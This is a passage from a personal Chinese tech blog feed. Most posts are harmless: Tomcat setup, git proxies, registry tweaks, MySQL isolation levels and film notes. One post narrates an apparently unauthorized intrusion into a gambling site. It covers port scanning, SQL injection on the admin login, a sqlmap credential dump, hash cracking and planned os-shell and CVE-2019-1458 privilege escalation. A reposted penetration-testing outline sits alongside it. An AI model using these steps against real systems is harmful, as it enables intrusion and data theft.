<h2 id="网页内容"><a href="#网页内容" class="headerlink" title="网页内容"></a>网页内容</h2><p>比如说我这里是想添加一个小游戏<br>游戏github：<a class="link" href="https://github.com/SadTomlzr/catch-cat">https://github.com/SadTomlzr/catch-cat<i class="fas fa-external-link-alt"></i></a><br>原游戏地址：<a class="link" href="https://sadtomlzr.github.io/catch-cat/">https://sadtomlzr.github.io/catch-cat/<i class="fas fa-external-link-alt"></i></a><br>这里我直接把那几个文件放在新建的文件夹里了</p>
<p><img src="image-20210619210816615.png" alt="image-20210619210816615"></p>
<p><img src="image-20210619210832495.png" alt="image-20210619210832495"></p>
<h2 id="停用渲染"><a href="#停用渲染" class="headerlink" title="停用渲染"></a>停用渲染</h2><p>在hexo的配置文件_config.yml 里的skip_render中添加不需要渲染的文件</p>
<p>** 注意：skip_render参数设置的路径是相对于source目录的路径。 **，比如D:\MyBlog\source\Cat目录，就写成Cat/*就行了，*表示全部文件，可以</p>
<p><img src="image-20210619211021410.png" alt="image-20210619211021410"></p>
<h2 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h2><p>这样添加的页面是在博客中是没有入口的。就是只能输url进去。入口需要在主题里添加，</p>
]]></content>
  </entry>
  <entry>
    <title>基本的渗透测试流程</title>
    <url>/2021/04/05/%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B-This-is-Y/</url>
    <content><![CDATA[<p>转自：<a class="link" href="https://zhuanlan.zhihu.com/p/212503594">https://zhuanlan.zhihu.com/p/212503594<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="一、目标确认"><a href="#一、目标确认" class="headerlink" title="一、目标确认"></a>一、目标确认</h2><p>目标确认指明确此次渗透的目标（获取权限还是获取数据？）、范围时间、约束条件等。这个目标有两层含义，简单来说就是最终目的是什么？我要拿到什么？</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>信息收集：在明确目标之后，要收集目标范围内的各类信息。在一开始接触渗透测试的时候，你可能听过这样一句话，渗透测试的本质是信息收集。确实没错，为什么需要做信息收集？因为你不去做信息收集，那么你攻击的范围就会很窄，死盯着一个现成的域名或一个IP，无异于把自己框死了。我在实际的项目中，经常会遇到一些同事拿着问题过来找我，说自己做不下去了，无法再继续深入了，一般在这个时候，我都会给他们说，当你没有办法再做下去的时候那就继续回去做信息收集，去看看你遗漏了什么。</p>
<p>那么我们在信息收集的时候要做收集哪些信息呢？怎么收集呢？信息要收集：域名、子域名、IP及端口、IP反向查域名、服务提供商、应用服务系统\版本、域名历史解析IP、服务端框架\语言、开源情报、防御措施等等。</p>
<p>信息收集工具，目前市面上有非常非常多，大家可以根据自己的喜好进行选择就可以。</p>
<h2 id="三、漏洞发现"><a href="#三、漏洞发现" class="headerlink" title="三、漏洞发现"></a>三、漏洞发现</h2><p>漏洞发现：在信息收集的基础上发现目标应用系统的漏洞。漏洞发现我为大家整理了四个方面：</p>
<p>框架组件公开漏洞：根据所使用的的框架组件版本情况，查找公开漏洞验证payload，通过手工或者工具的手段验证漏洞。一般这种漏洞，存在都是一些不小的漏洞。</p>
<p>传统漏洞：像比如xss\sql注入\ssrf等传统的网络安全漏洞，这一部分可以利用手工或者工具进行识别，就考验大家对于漏洞的掌握程度了。</p>
<p>口令漏洞：对系统登录入口点采用口令攻击。</p>
<p>代码审计0day：在开源或未开源的情况下，获取目标应用系统源码，进行代码审计</p>
<h2 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h2><p>漏洞利用：对已发现的目标漏洞进行利用，通过漏洞利用获取目标系统权限。</p>
<p>由于针对不同的漏洞其自身特点，漏洞利用方式也不尽同，漏洞利用考验一个人对漏洞理解的深度问题，与漏洞发现有很大的不同，要想在渗透测试过程中能够有效的对目标进行攻击，需要充分了解各个漏洞的利用方式，并且越多越好，这样我们才能应不同的场景，建议大家在经典Web漏洞的基础上，针对每种漏洞通过搜索漏洞名称+利用方式（如SQL注入漏洞利用方式）不断的深入学习，保持对各类公开漏洞的关注，学习各类安全自动化工具的原理，如通过学习SQLMAP源码学习SQL注入利用，学习XSS平台利用代码学习XSS利用。</p>
<h2 id="五、权限维持"><a href="#五、权限维持" class="headerlink" title="五、权限维持"></a>五、权限维持</h2><p>权限维持、内网渗透：进入目标内容，进行横向拓展，向渗透目标靠近</p>
<h2 id="六、目标获取"><a href="#六、目标获取" class="headerlink" title="六、目标获取"></a>六、目标获取</h2><p>目标获取、痕迹清理：获取渗透目标权限或数据，回传数据，进行痕迹清理。</p>
]]></content>
  </entry>
  <entry>
    <title>好文章收藏夹</title>
    <url>/2021/04/04/%E5%A5%BD%E6%96%87%E7%AB%A0%E6%94%B6%E8%97%8F%E5%A4%B9-This-is-Y/</url>
    <content><![CDATA[<p>android获取经纬度 ：<br>    <a class="link" href="https://www.jianshu.com/p/d1b2bfb355dd">https://www.jianshu.com/p/d1b2bfb355dd<i class="fas fa-external-link-alt"></i></a><br>    <a class="link" href="https://blog.csdn.net/jason0539/article/details/12047963">https://blog.csdn.net/jason0539/article/details/12047963<i class="fas fa-external-link-alt"></i></a></p>
<p>android写入txt文件并获取：<br>    <a class="link" href="https://www.jianshu.com/p/fdf6178d1a66">https://www.jianshu.com/p/fdf6178d1a66<i class="fas fa-external-link-alt"></i></a></p>
<p>操作系统死锁与死锁的处理：<br>    <a class="link" href="https://blog.csdn.net/weiyongle1996/article/details/71511956">https://blog.csdn.net/weiyongle1996/article/details/71511956<i class="fas fa-external-link-alt"></i></a></p>
<p>双向链表：<br>    <a class="link" href="https://www.jianshu.com/p/c47d40e9c85c">https://www.jianshu.com/p/c47d40e9c85c<i class="fas fa-external-link-alt"></i></a></p>
<p> 微信小程序的渗透五脉<br>     <a class="link" href="https://www.hackinn.com/index.php/archives/672/">https://www.hackinn.com/index.php/archives/672/<i class="fas fa-external-link-alt"></i></a></p>
<p>常见逻辑漏洞解析<br>    <a class="link" href="https://www.cnblogs.com/X-caiji/p/11209963.html">https://www.cnblogs.com/X-caiji/p/11209963.html<i class="fas fa-external-link-alt"></i></a></p>
<p>正则表达式30分钟入门教程（其实不止30分钟）<br>    <a class="link" href="https://deerchao.cn/tutorials/regex/regex.htm">https://deerchao.cn/tutorials/regex/regex.htm<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>安装Tomcat，配置环境变量时遇上的坑</title>
    <url>/2020/02/11/%E5%AE%89%E8%A3%85Tomcat%EF%BC%8C%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%97%B6%E9%81%87%E4%B8%8A%E7%9A%84%E5%9D%91-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12297395.html">源地址：https://www.cnblogs.com/This-is-Y/p/12297395.html<i class="fas fa-external-link-alt"></i></a></p>
<p>在安装环境变量时，可能会遇上</p>
<p>The CATALINA_HOME environment variable is not defined correctly<br>This environment variable is needed to run this program</p>
<img src="1503868-20200211225208737-1270450378.png" alt width="593" height="310">

<p>这时候要在环境变量里配置好</p>
<p>CATALINA_HOME</p>
<p>E:\apache-tomcat-7.0.99</p>
<p>就像这样，</p>
<img src="1503868-20200211225441242-1409511858.png" alt width="591" height="578">

<p> </p>
<p> </p>
<p> 好，再试一遍，</p>
<p>然鹅你会发现还是不行，</p>
<img src="1503868-20200211225919317-279401772.png" alt width="592" height="309">

<p> </p>
<p> </p>
<p> 第一个点来了，更新完环境变量后，虽然不需要重启电脑，但是需要重启程序，因为你之前打开程序，用的还是之前的环境变量。</p>
<p> 所以这里在修改完环境变量后，新打开一个cmd窗口，重新输入startup.bat。发现还是报错了，那再回到之前修改的那里，先看第一处，很正常，就是Tomcat的路径。</p>
<img src="1503868-20200211230525378-1186335679.png" alt width="593" height="580">

<p> </p>
<p> </p>
<p> 再看第二处，认真看可以发现，有一个分号。这时候点击下面的编辑文本，在这里把最后的分号删掉，</p>
<img src="1503868-20200211230907141-557306054.png" alt width="595" height="154">

<p> </p>
<p> </p>
<p> 因为在一开始编辑的时候，在path路径里看到不同的value后面都加了分号，所以自作聪明地在这里也加上了分号，同时不知道要重启cmd窗口，两个问题加在一起，导致一个环境变量配了我好半天。</p>
<img src="1503868-20200211231204034-1928792610.png" alt width="595" height="154">

<p> </p>
<p> </p>
<p> 在配置成功后，再次输入startup.bat，应该就可以打开一个新窗口了，像这样，这时候就可以打开<a class="link" href="http://127.0.0.1:8080/">http://127.0.0.1:8080/<i class="fas fa-external-link-alt"></i></a>了，记住这个Tomcat地窗口不能关，关了窗口，服务就关闭了。</p>
<img src="1503868-20200211231515927-2016591218.png" alt width="592" height="309">

<p> </p>
<p> </p>
<p> 如果出现乱码，找到conf下面的logging.properties文件，打开，修改这一行的值为GBK，默认应该是UTF-8</p>
<img src="1503868-20200211232114536-513354596.png" alt width="592" height="348">

<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>安装zsh时git太慢，换代理</title>
    <url>/2020/12/21/%E5%AE%89%E8%A3%85zsh%E6%97%B6git%E5%A4%AA%E6%85%A2%EF%BC%8C%E6%8D%A2%E4%BB%A3%E7%90%86-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14170330.html">源地址：https://www.cnblogs.com/This-is-Y/p/14170330.html<i class="fas fa-external-link-alt"></i></a></p>
<p>电脑用的<img src="1503868-20201221215539766-413682498.png" loading="lazy" style="vertical-align: top">进行科学冲浪，开启的全局（也不知道开PAC有没有用，没去测试了）</p>
<p> </p>
<p>端口如下</p>
<img src="1503868-20201221215149658-220143656.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p>来自<a class="link" href="https://gist.github.com/laispace/666dd7b27e9116faece6">https://gist.github.com/laispace/666dd7b27e9116faece6<i class="fas fa-external-link-alt"></i></a></p>
<p>给git设置代理</p>
<p> git config –global http.proxy ‘socks5://127.0.0.1:10808’<br> git config –global https.proxy ‘socks5://127.0.0.1:10808’</p>
<p> </p>
<p>取消代理</p>
<p>git config –global –unset http.proxy</p>
<p>git config –global –unset https.proxy</p>
<p> </p>
<p> </p>
<p> </p>
<img src="1503868-20201221215342041-839913743.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 这种情况是没配置好</p>
<img src="1503868-20201221215434314-1677226010.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 有个代理git起来是真滴快</p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>对某菠菜网站的渗透学习</title>
    <url>/2020/06/07/%E5%AF%B9%E6%9F%90%E8%8F%A0%E8%8F%9C%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13061165.html">源地址：https://www.cnblogs.com/This-is-Y/p/13061165.html<i class="fas fa-external-link-alt"></i></a></p>
<p>隔壁老王给了一个站过来，说给我们玩一下。打开是一个菠菜网站，但是已经没人管了。</p>
<img src="1503868-20200607153301601-446836927.png" width="800" loading="lazy">

<p> </p>
<p> </p>
<p> 先扫端口，目录，找后台</p>
<p>目录没有扫出什么有用的东西</p>
<img src="1503868-20200607154036049-836824271.png" width="800" loading="lazy">

<p> 然后是nmap扫端口，</p>
<img src="1503868-20200607154017399-1787204033.png" width="800" loading="lazy">

<p> </p>
<p> 在端口这边发现http服务开了有5个端口。同时还开了3389。检查5个http端口，发现81端口是后台</p>
<img src="1503868-20200607154241398-670292443.png" width="800" loading="lazy">

<p> </p>
<p> 手动输了几个账号密码，发现不行，但是通过回显的不同，确定了有个账号是admin，同时也确定了这个地方有存在注入。</p>
<img src="1503868-20200607154506644-1750983100.png" width="800" loading="lazy">

<p> </p>
<p> <img src="1503868-20200607154521943-558014734.png" width="800" loading="lazy"></p>
<p> </p>
<p> <img src="1503868-20200607154601739-764843900.png" width="800" loading="lazy"></p>
<p> </p>
<p> 但是手注技术不行，，所以这边抓包丢到sqlmap里去跑一下试试看。</p>
<img src="1503868-20200607155119390-806830911.png" width="800" loading="lazy">

<p> sqlmap还是强</p>
<p>然后就是–dbs –tables –columns –dump。找到用户密码</p>
<img src="1503868-20200607202548559-2092952524.png" width="800" loading="lazy">

<p> </p>
<p> chamd5一下，就得到了后台账号密码。</p>
<img src="1503868-20200607202657084-115274562.png" width="800" loading="lazy">

<p> </p>
<p> 看到这些，我只想说，珍爱生命，远离赌博。</p>
<p> </p>
<p>最后在隔壁老王指点下，可以直接用sqlmap的–os-shell来获取shell，通过vmic qfe来查看补丁情况，在<a class="link" href="https://bugs.hacking8.com/tiquan/?tdsourcetag=s_pctim_aiomsg">提权辅助网页<i class="fas fa-external-link-alt"></i></a>上可以查看补丁情况。然后用cve-2019-1458来进行提权。<code class="prism language-bash has-numbering" style="position: unset"></code></p>
<p>还没写完</p>
<p>后面的操作还等晚上老王直播教我</p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>将terminal添加到资源管理器右键菜单</title>
    <url>/2021/03/13/%E5%B0%86terminal%E6%B7%BB%E5%8A%A0%E5%88%B0%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14529491.html">源地址：https://www.cnblogs.com/This-is-Y/p/14529491.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>选项</strong></p>
<p>打开注册表regedit，定位到  计算机\HKEY_CLASSES_ROOT\Directory\Background\shell\</p>
<p>右键shell，新建一个项，名字会显示在菜单中</p>
<img src="1503868-20210313164117254-1422882256.png" alt loading="lazy">

<p> </p>
<p> </p>
<p>如下</p>
<img src="1503868-20210313164049519-888425769.png" alt loading="lazy">

<p> </p>
<p> </p>
<p><strong>图标</strong></p>
<p> </p>
<p> 在点击新建的项，可以添加一个字符值，名称为Icon，数值为一张icon图片。作为图标，</p>
<img src="1503868-20210313164335468-116079778.png" alt loading="lazy">

<p> </p>
<img src="1503868-20210313164429973-1468144519.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p> <img src="1503868-20210313164452601-1485470418.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><strong>命令</strong></p>
<p>右键新建的terminal，添加一个项，命名为command（只能叫这个）</p>
<p> 然后把command的默认数值改为</p>
<p>“C:\Users\This_is_Y\AppData\Local\Microsoft\WindowsApps\wt.exe” -d .</p>
<p>前面是terminal的路径，-d .表示在当前目录打开</p>
<img src="1503868-20210313165551032-632857424.png" width="1200" loading="lazy">

<p>terminal一般来说在C:\Users\用户名\AppData\Local\Microsoft\WindowsApps\wt.exe</p>
<img src="1503868-20210313165235302-2131735593.png" alt>

<p> </p>
<p> </p>
<p>1、额外插一句，要让选项按住shift键＋右键才出来的话，加入这个字符串值就行了，不需要数据，空的就好了</p>
<p>“Extended”=””</p>
<img src="1503868-20210313170214867-526300376.png" alt loading="lazy">

<p> </p>
<p>2、再插一句，”LegacyDisable”=””可以隐藏选项而不是删掉</p>
<p> <img src="1503868-20210313172845536-658433349.png" alt loading="lazy"></p>
<p> 3、桌面右键菜单定位到   计算机\HKEY_CLASSES_ROOT\DesktopBackground\Shell</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>当手机屏幕无法使用时</title>
    <url>/2022/03/20/%E5%BD%93%E6%89%8B%E6%9C%BA%E5%B1%8F%E5%B9%95%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%E6%97%B6-This-is-Y/</url>
    <content><![CDATA[<p>家里有个旧手机，但是屏幕没用了，最近正好需要用一个手机完成一些工作，就打算用scrcpy把它复活一下。</p>
<p>准备操作的时候面临一下几个问题</p>
<ol>
<li>连接scrcpy时需要开启usb调试（在开发者选项里），屏幕受损无法控制。</li>
<li>有些情况好像要usb调试的安全模式（具体联系还没搞明白）。打开这个安全模式需要插卡。</li>
<li>在上面都解决的情况下，手机通过usb连接后，有一步配对的过程，也需要手动操作。</li>
</ol>
<p>针对这几个问题，我收集了一些办法，最后也是成功了</p>
<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>屏幕不能用，所以我买了一个otg线来连接鼠标，用鼠标来控制。手机是小米的，直接就是支持otg的，有的系统的手机这一功能需要提前打开，这种就没有办法了，不过可以尝试使用语音助手（类似小爱，siri）来打开这功能。</p>
<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>查了一下，安全模式需要插卡这一设定的初心主要是防止线下经销商利用adb 批量预置垃圾应用。但是好像只需要插上卡，然后打开，再把卡拔掉，就没事了</p>
<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>这一步卡得最久，因为插上了usb线，所以otg鼠标用不了，鼠标用不了，RSA密钥配对这个选项我就点不了 ‘是’，然后adb就一直是 unauthorized，导致scrcpy连接不上。<br><img src="image-20220320183045047.png" alt="image-20220320183045047"><br><img src="image-20220320183132933.png" alt="image-20220320183132933"></p>
<p>这个问题有这几种解决方法</p>
<h2 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h2><p>手边有蓝牙鼠标的话，连上蓝牙鼠标再操作</p>
<h2 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h2><p>买一个otg多功能线，类似拓展坞那种东西，tb上10来块钱</p>
<h2 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h2><p>win10有一个自带的投影功能，一般需要先在设置-添加可选功能里添加一个无线显示器<br><img src="image-20220320183636636.png" alt="image-20220320183636636"><br>然后在设置-系统-投影到此电脑里。通过无线连接，让手机投影到win10上，这时候win10是可以控制手机的。然后usb连接电脑，再点是就行了。</p>
<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p><a class="link" href="https://it.wenda123.org/question/androidstack/218640/how-do-i-bypass-the-rsa-authentication-dialog-box-to-enable-controlling-phone-fr">链接在此<i class="fas fa-external-link-alt"></i></a>。只需复制adbkey.pubbub到设备位置:/data/misc/adb/并从重命名adbkey.pub到adb_keyschmod 0644然后重启。但是因为我手机没有root，访问不到这些文件。</p>
<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>（我最后解决的）先用otg鼠标打开小米自带的无障碍功能里的肢体这一块（花几分钟学一下）。然后就可以语音控制手机了。非常好用。<br><img src="image-20220320184258574.png" alt="image-20220320184258574"></p>
<p>要用快捷键的话，需要在启动的时候加上一个–shortcut-mod=rctrl<br>具体可以看<a class="link" href="http://www.8fe.com/jiaocheng/1934.html">http://www.8fe.com/jiaocheng/1934.html<i class="fas fa-external-link-alt"></i></a><br><img src="image-20220320190058356.png" alt="image-20220320190058356"></p>
]]></content>
  </entry>
  <entry>
    <title>影截</title>
    <url>/2020/06/29/%E5%BD%B1%E6%88%AA/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13210728.html">源地址：https://www.cnblogs.com/This-is-Y/p/13210728.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>天堂电影院</strong></p>
<img src="1503868-20200629185351362-868216684.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 艾琳娜，你是我睡前最后的念想，又是我早上醒来第一个想到的人，你总是出现在我的梦里，我知道打电话不合适但是我喜欢你。<img src="1503868-20200629190143713-225521774.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> 回忆就是因为回不去才可爱，才可贵。错过多年以后let go的坦然有时比悲情的执着更能予脑海留香</p>
<p>“电影和生活不一样 ，生活难多了“</p>
<p> </p>
<p>“有一次，国王为美丽的公主开宴会</p>
<p>有个士兵在一旁站岗，看到公主经过他面前</p>
<p>她是绝色佳人，他立刻爱上她</p>
<p>但卑微的士兵怎配得上国王的女儿</p>
<p>有一天，他终于设法接近她</p>
<p>并告诉她没有她活不下</p>
<p>公主被他的深情感动，她告诉士兵</p>
<p>’如果你能等我100天，且日日夜夜在阳台下等我，百日之后，我就是你的‘</p>
<p>听了这话，士兵在阳台下等</p>
<p>一天，两天。十天，二十天</p>
<p>公主每晚往外探，他仍伫立终宵</p>
<p>风吹雨打,雪压霜欺都阻挡不了他</p>
<p>鸟停在头上，蜜蜂叮他，他都不动</p>
<p>但是，在第九十天时，士兵已全身苍白且消瘦</p>
<p>眼泪从眼眶里流了出来</p>
<p>他已支撑不住了，甚至连睡觉的力气都没有</p>
<p>公主一直注视着他</p>
<p>最后，在第九十九天的晚上，士兵站了起来</p>
<p>提起椅子，走了，走了”</p>
<p> </p>
<p>“我知道士兵为何会那么做</p>
<p>因为他明白，如果在一百天时</p>
<p>公主不承认她的约定</p>
<p>那么士兵将会伤心难过、绝望地死去</p>
<p>所以他选择在99天的夜晚离去</p>
<p>这样公主将会永远惦记着他“</p>
<p>看到多多假扮神父，对艾琳娜说愿意每天在她家外面等她知直到她爱上他，我以为前面的故事只是导演安排的一处铺垫，直到看到多多退伍，和艾佛特在海边畅谈，我才意识到自己的格局是多么小，多多就是那个士兵，公主就是艾琳娜，只是他不是在艾琳娜家外面等，而是在这座小镇等，等艾琳娜的消息。除此之外，士兵是自己醒悟的，而多多，是艾佛特成就了他。</p>
<p> </p>
<p><strong>海上钢琴师</strong></p>
<img src="1503868-20200629214956824-1285485372.png" alt loading="lazy">

<p> </p>
<img src="1503868-20200629215121706-335240939.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 可能会有人不理解1900的做法，放弃陆地，与弗吉尼亚号共生死。我一开始也想不通。但是后来，站在他的角度想，对于1900来说，他出生在这艘船上，长大在这艘船上，对他来说，弗吉尼亚号就是他的一切。换成我们，我们出生在陆地上，成长在陆地上，要我们为了自由（？），名利，金钱放弃陆地，转而去海洋或者天空，地底生活，你会愿意吗。就像他自己说的那样，他在舷梯上看不到尽头，他害怕这种无限。</p>
<p>借用豆瓣中一个人的话：</p>
<p>每个人都在不同的船上，船的大小不同，人生格局不同，这个世界太复杂，也有少部分人活在“非主流社会”，不出山、不出村的人，一辈子同在一艘船上无区别。但，如果能够通过手中的“钢琴”把有限的人生变为无限，不下船，也是很棒的一生。而<strong>主流社会是太大的船，让人体失去自我存在价值</strong>。 一九00不是让我放弃自己的人生选择，出身、格局不可逆（生于主流社会，家庭、环境、教育塑造了自我的船只），1900告诉我：无论大船小船都要有自己的“钢琴”如此，才能把有限的“琴键”变成无限可能。只有做自己真正擅长的、兴趣的事，才有人生的价值及意义展现出无限可能。 任何时候都可以“改变生活，从头开始”，格局可以打破。 </p>
<p> </p>
<p>1900遇见那姑娘时弹奏的曲子：Playing love（piano version） —Ennio Morricone</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>彻底卸载flash</title>
    <url>/2021/03/12/%E5%BD%BB%E5%BA%95%E5%8D%B8%E8%BD%BDflash-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14526223.html">源地址：https://www.cnblogs.com/This-is-Y/p/14526223.html<i class="fas fa-external-link-alt"></i></a></p>
<p>win+r输入winver，查看自己电脑版本</p>
<img src="1503868-20210312202938184-150647971.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 打开<a target="_blank">https://www.catalog.update.microsoft.com/Search.aspx?q=KB4577586</a></p>
<p>找到适配自己电脑版本的补丁，下载安装即可</p>
<img src="1503868-20210312202812603-848062687.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 安装完重启就好了，</p>
<p>flash主要在这几个文件夹，资源管理器直接输入定位到目标文件夹</p>
<p>C:\Windows\SysWOW64\Macromed\Flash</p>
<p>%appdata%\Macromedia\Flash Player</p>
<p>%appdata%\Adobe\Flash Player</p>
<img src="1503868-20210312203148413-530360175.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p>C:\Windows\SysWOW64\Macromed\Flash</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>数据库的隔离性</title>
    <url>/2021/03/29/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E9%9A%94%E7%A6%BB%E6%80%A7-This-is-Y/</url>
    <content><![CDATA[<p>要讨论隔离性要先说说事务</p>
<h3 id="什么是事务"><a href="#什么是事务" class="headerlink" title="什么是事务"></a>什么是事务</h3><p>事务是应用程序中一系列严密的操作，所有操作必须成功完成，否则在每个操作中所作的所有更改都会被撤消。也就是事务具有 <strong>原子性</strong>，一个事务中的一系列的操作要么全部成功，要么一个都不做。<br>事务的结束有两种，当事务中的所以步骤全部成功执行时，事务提交。如果其中一个步骤失败，将发生回滚操作，撤消撤消之前到事务开始时的所以操作。</p>
<h3 id="事务的-ACID"><a href="#事务的-ACID" class="headerlink" title="事务的 ACID"></a>事务的 ACID</h3><p>事务具有四个特征：原子性（ Atomicity ）、一致性（ Consistency ）、隔离性（ Isolation ）和持续性（ Durability ）。这四个特性简称为 ACID 特性。</p>
<ol>
<li>原子性。事务是数据库的逻辑工作单位，事务中包含的各操作要么都做，要么都不做</li>
<li>一致性。事 务执行的结果必须是使数据库从一个一致性状态变到另一个一致性状态。因此当数据库只包含成功事务提交的结果时，就说数据库处于一致性状态。如果数据库系统 运行中发生故障，有些事务尚未完成就被迫中断，这些未完成事务对数据库所做的修改有一部分已写入物理数据库，这时数据库就处于一种不正确的状态，或者说是 不一致的状态。</li>
<li>隔离性。一个事务的执行不能其它事务干扰。即一个事务内部的操作及使用的数据对其它并发事务是隔离的，并发执行的各个事务之间不能互相干扰。</li>
<li>持续性。也称永久性，指一个事务一旦提交，它对数据库中的数据的改变就应该是永久性的。接下来的其它操作或故障不应该对其执行结果有任何影响。</li>
</ol>
<p>然后问题就来了,假如有两个事务，在事务进行时，同时或间接的控制同一个数据。就会出现操作系统中的类似资源锁资源的问题。具体如下</p>
<h5 id="会引起的问题"><a href="#会引起的问题" class="headerlink" title="会引起的问题"></a>会引起的问题</h5><ol>
<li>脏读(Drity Read)：某个事务已更新一份数据，另一个事务在此时读取了同一份数据，由于某些原因，前一个RollBack了操作，则后一个事务所读取的数据就会是不正确的。</li>
<li>不可重复读(Non-repeatable read):在一个事务的两次查询之中数据不一致，这可能是两次查询过程中间插入了一个事务更新的原有的数据。</li>
<li>幻读(Phantom Read):在一个事务的两次查询中数据笔数不一致，例如有一个事务查询了几列(Row)数据，而另一个事务却在此时插入了新的几列数据，先前的事务在接下来的查询中，就有几列数据是未查询出来的，如果此时插入和另外一个事务插入的数据，就会报错。</li>
</ol>
<h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p>针对上述会出现的问题，就有了数据隔离。在MySQL中，实现了这四种隔离级别，分别有可能产生问题如下所示：</p>
<table>
<thead>
<tr>
<th align="center">隔离级别</th>
<th align="center">脏读</th>
<th align="center">不可重复读</th>
<th align="center">幻读</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Read uncommited</td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">Read commited</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">Repeatable read</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">Serializable</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">×</td>
</tr>
</tbody></table>
<p>可能不是很容易理解</p>
<p>直接上手亲自操作一下会更清楚</p>
<p>terminal窗口，开四个窗口，新建一个数据库，建一个表，插入几条数据</p>
<pre><code>create table `test1`(
`id` int(11) unsigned not null auto_increment,
`num` int(11) not null default &#39;0&#39;,
primary key(`id`)
)engine=InnoDB auto_increment=4 default charset=utf8;
insert into test1 value(1,5);
insert into test1 value(2,10);
insert into test1 value(3,15);
</code></pre>
<p><img src="image-20210330232758518.png" alt="image-20210330232758518"></p>
<h3 id="Msyql中的事务处理"><a href="#Msyql中的事务处理" class="headerlink" title="Msyql中的事务处理"></a>Msyql中的事务处理</h3><p>首先设置隔离级别<br>    set session transaction isolation level read uncommitted;</p>
<p>然后开始一个事务<br>    start transaction;</p>
<p>之后就是事务的内容，插入，检索，更新，删除数据等，</p>
<p>最后才是提交数据<br>    commit;</p>
<p>还有一个是rollbak，回滚事务<br>    rollback;</p>
<p><img src="image-20210331142932189.png" alt="image-20210331142932189"></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="read-uncommitted"><a href="#read-uncommitted" class="headerlink" title="read uncommitted"></a>read uncommitted</h3><p>terminal开启3个窗口，一个进行事务A，一个进行事务B，一个作旁观者观察<br>A：设置为read uncommitted，启动，查询，但是先不提交，此时的数据是之前的样子<br>     set  session transaction isolation level read uncommitted</p>
<p><img src="image-20210331143957011.png" alt="image-20210331143957011"></p>
<p>B：可以不设置隔离等级。启动事务，更新一条数据，然后A再select查看一下数据，可以看到数据已经改变了<br>    update isoluate.test1 set num=50 where id=1;</p>
<p><img src="image-20210331144444698.png" alt="image-20210331144444698"></p>
<p>这时候B再rollback，A再查询数据，又变回去了</p>
<p><img src="image-20210331152956281.png" alt="image-20210331152956281"></p>
